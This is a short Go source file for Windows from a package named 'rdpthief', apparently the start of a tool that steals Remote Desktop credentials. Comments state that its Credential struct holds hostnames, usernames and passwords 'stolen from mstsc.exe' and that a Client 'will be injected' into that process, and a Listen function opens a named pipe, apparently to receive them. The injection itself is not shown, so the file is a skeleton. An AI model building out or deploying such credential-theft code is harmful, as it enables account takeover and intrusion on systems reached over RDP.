// +build windows

package rdpthief

import "github.com/Microsoft/go-winio"

// Credential is the credential that stolen from mstsc.exe.
type Credential struct {
	Hostname string
	Username string
	Password string
}

// Client will be injected to the mstsc.exe
type Client struct {
}

func Listen() {
	winio.ListenPipe(`\\.\pipe\test`, nil)

}
